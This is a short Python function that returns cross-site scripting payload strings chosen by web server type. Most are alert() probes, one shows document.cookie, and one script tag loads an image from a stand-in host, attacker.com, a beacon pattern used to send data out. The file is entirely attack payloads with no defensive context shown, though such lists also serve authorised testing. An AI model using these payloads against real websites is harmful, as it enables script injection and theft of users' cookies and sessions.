def generate_payloads(server_type='generic'):
    if server_type == 'nginx':
        return ['<img src=x onerror=alert("XSS")>', '<script>new Image().src="http://attacker.com/"</script>']
    elif server_type == 'apache':
        return ['<script>alert(document.cookie)</script>', '<iframe src="javascript:alert(\'XSS\');"></iframe>']
    elif server_type == 'iis':
        return ['<svg/onload=alert(1)>', '<img src=x onerror=alert(/XSS/)>']
    else:
        return ['<script>alert("XSS")</script>']
